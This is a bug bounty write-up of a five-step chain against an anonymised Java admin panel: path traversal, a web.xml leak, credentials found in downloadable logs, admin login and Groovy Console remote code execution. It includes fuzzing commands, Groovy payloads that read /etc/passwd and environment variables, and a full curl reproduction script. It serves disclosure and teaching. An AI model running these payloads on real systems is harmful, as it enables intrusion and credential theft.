# Groovy Console RCE via Limited Path Traversal → Log Disclosure → Credential Discovery → Admin Access

**Bounty:** $40,000 | **Author:** HX007 (Abdullah Nawaf) & OrwaGodfather
**Platform:** Bugcrowd | **Year:** 2024-2025

## The Full Chain (5 Steps)

```
Limited Path Traversal → /WEB-INF/web.xml → /admin/incident-report (log download) 
→ Admin creds in logs → Admin login → Groovy Console RCE → Logs contain RCE output
```

---

## Step 1 — Discovery & Limited Path Traversal

### Initial Recon
- Port scan found `http://admin.target.com:8443` — returned **404**
- Hunter didn't stop at 404! Fuzzed: `http://admin.target.com:8443/FUZZ`
- Found `/admin/` → redirect to JSF login page: `/admin/faces/jsf/login.xhtml`
- Login tested — no vulnerabilities found

### Download Endpoint Discovery
- Continued fuzzing under `/admin/`: `http://admin.target.com:8443/admin/FUZZ`
- Found `/admin/Download` → HTTP 200 but empty response (missing parameters)

### Parameter Discovery via Valid File
- Used a known-good file: `admin/js/main.js`
- Fuzzed for the correct parameter name:
```
ffuf -u "http://admin.target.com:8443/admin/download?FUZZ=/js/main.js" \
  -w params.txt -mr "200"
```
- Found parameter: **`filename`**
- `http://admin.target.com:8443/admin/download?filename=/js/main.js` → **works!**

### Confirming Limited Path Traversal
- Tried reading `/etc/passwd` → **blocked!** (only works within `/admin/`)
- Confirmed: **Limited Path Traversal** — only files under `/admin/` are accessible

---

## Step 2 — WEB-INF/web.xml Leak → Endpoint Discovery

Since it's a Java environment, read `/WEB-INF/web.xml`:
```
http://admin.target:8443/admin/download?fileName=/WEB-INF/web.xml
```

### Discovered Endpoints from web.xml
| Endpoint | Description |
|----------|-------------|
| `/admin/download/` | Path traversal (already found) |
| `/admin/faces/` | JSF login (already known) |
| **`/admin/incident-report`** | **NEW — Real-time log download!** |

### The Goldmine: `/admin/incident-report`
- Visiting this endpoint downloads a **huge ZIP file**: `incident-report-xxxxxx.zip`
- This is a **real-time log file** — freshly generated each request!
- **Key insight:** Every time you visit, a NEW log is generated with current system state

---

## Step 3 — Credential Discovery in Logs

### Mining the Log File
- Downloaded the incident-report ZIP
- Extracted and examined logs
- Found **admin password history**:

| Hash | Password | Status |
|------|----------|--------|
| `21232f297a57a5a743894a0e4a801fc3` | `admin` (MD5) | **Old password, not working** |
| `2a92e4f4cce321db24c8f389a287d793` | **`Glglgl123`** (MD5) | **WORKING!** |

### Admin Login
- URL: `/admin/faces/jsf/login.xhtml`
- Credentials: `admin:Glglgl123`
- Result: **Full admin panel access!** ✅

---

## Step 4 — Groovy Console RCE Discovery

### Exploring the Admin Panel
- Found function: **`export_step2.xhtml`**
- This page has a **Groovy Console** — a development tool that executes Groovy/Java code

### What is the Groovy Console?
The Groovy Console is a development and debugging tool that provides an interface to execute Groovy scripts. Security issues if accessible to unauthorized users:

| Risk | Description |
|------|-------------|
| **Arbitrary Code Execution** | Run any Groovy/Java code on the server |
| **Sensitive Information Exposure** | Read config files, env vars, credentials |
| **Privilege Escalation** | Perform operations normal users can't |

### First RCE Attempt
Payload:
```groovy
print "id".execute().text
```
**Result:** Command executed BUT **no output returned**! 😱

### Troubleshooting
Tried multiple payloads:
```groovy
print "id".execute().text
print "sudo cat /etc/passwd".execute().text
```
**Same issue:** Commands run, but output doesn't appear in the Groovy Console response.

---

## Step 5 — Chaining Logs for RCE Output

### The Aha! Moment
Remember the `/admin/incident-report` endpoint? The **real-time log file**?

Since:
- RCE commands execute BUT produce no visible output in the console
- The **incident-report logs everything** happening on the server
- Visiting `/admin/incident-report` generates a **fresh log with current state**

### The Exploit Chain
```
1. Login as admin (admin:Glglgl123)
2. Go to Groovy Console (export_step2.xhtml)
3. Execute: print "sudo cat /etc/passwd".execute().text
4. Visit: http://admin.target:8443/admin/incident-report
5. Download the latest ZIP → RCE output is INSIDE the logs!
```

### Why Not OOB-RCE?
| Approach | Why Not |
|----------|---------|
| **OOB-RCE** (DNS/HTTP callback) | WAF blocks outbound connections to external IPs |
| **Write file to server** | Same outbound issue + lower payout |
| **Log chain** | **$40,000 — direct RCE** confirmed via server-side evidence |

---

## Key Lessons

### 1. 🔥 Don't Stop at 404
> "Most hunters would ignore any subdomain returning a 404. But I don't!"

### 2. 🔥 Treat Bug Bounty Like a Game
> "Don't stop playing on the subdomain until you reach the ultimate goal."

Many hunters stop at the first finding:
- ❌ Stop at limited path traversal → report it
- ❌ Stop at log file download → report it
- ❌ Stop at creds in logs → report it
- ✅ **Chain everything until RCE** = $40,000

### 3. 🔥 Stick with the Subdomain
> "When you find a bug on a subdomain, keep it until you've completed all your tests."

One small discovery (limited path traversal) → log files → admin passwords → RCE → then circle BACK to the initial bug (incident-report) for the final piece!

### 4. 🔥 Quality Over Quantity — Split Reports
- Initially combined ALL findings into one report
- Program owner **requested splitting** into separate submissions
- Why? Allows program to offer **higher rewards** for individual findings
- **Total: $40,000**

---

## Technical Payloads Reference

### Groovy RCE Payloads
```groovy
// Basic — no output visible
print "id".execute().text

// Alternative syntax
"id".execute().text

// File read via Groovy
println new File("/etc/passwd").text

// Environment variables
println System.getenv()

// Runtime exec via Java interop
Runtime.getRuntime().exec("id")
```

### Log Access Pattern
```bash
# Download real-time logs
curl -sk -o incident-report.zip \
  "http://admin.target:8443/admin/incident-report" \
  -b "JSESSIONID=..."

# Extract and grep for command output
unzip -p incident-report.zip | grep -i "uid=\|root:\|command\|executed"
```

### Full Reproduction (curl)
```bash
# Step 1: Login
curl -sk -c cookies.txt \
  "http://admin.target:8443/admin/faces/jsf/login.xhtml" \
  -d "username=admin&password=Glglgl123"

# Step 2: Execute RCE via Groovy Console
curl -sk -b cookies.txt \
  "http://admin.target:8443/admin/export_step2.xhtml" \
  -d "groovyScript=print \"id\".execute().text"

# Step 3: Download log with RCE output
curl -sk -b cookies.txt -o rce_output.zip \
  "http://admin.target:8443/admin/incident-report"

# Step 4: Read output
unzip -p rce_output.zip | grep -A2 "uid="
```

---

## Detection Patterns for This Attack Class

### What to Look For in Your Testing

| Signal | What It Means |
|--------|---------------|
| Java/JSF app on alternative port (8080, 8443) | Admin panel candidate |
| `/admin/download?filename=` | LFI/Path Traversal candidate |
| `/WEB-INF/web.xml` readable | Source/config leak |
| `/incident-report` or `/log-download` | Real-time log access |
| Logs contain credentials | Credential disclosure |
| `export_step2.xhtml` or `groovyConsole` | Groovy Console = RCE |
| `*.xhtml` with `.execute()` or `groovy` in JS | Groovy/Java execution context |

### Similar Endpoint Patterns
- `/admin/download`, `/admin/export`, `/admin/export_step*`
- `/admin/logs`, `/admin/log`, `/admin/audit-log`
- `/incident-report`, `/incident`, `/system/logs`
- `/faces/jsf/`, `/javax.faces.resource/`
- Any `*.xhtml` in admin panel

---

## See Also

- **`hunt-rce`** — Main RCE hunting methodology (Groovy Console section)
- **`hunt-source-leak`** — WEB-INF/web.xml, source code exposure
- **`bug-bounty/information-disclosure`** — Log file information disclosure
- **`bug-bounty-techniques`** — Real-world bug bounty chain techniques
- **`web-enumeration`** — Path discovery, parameter fuzzing
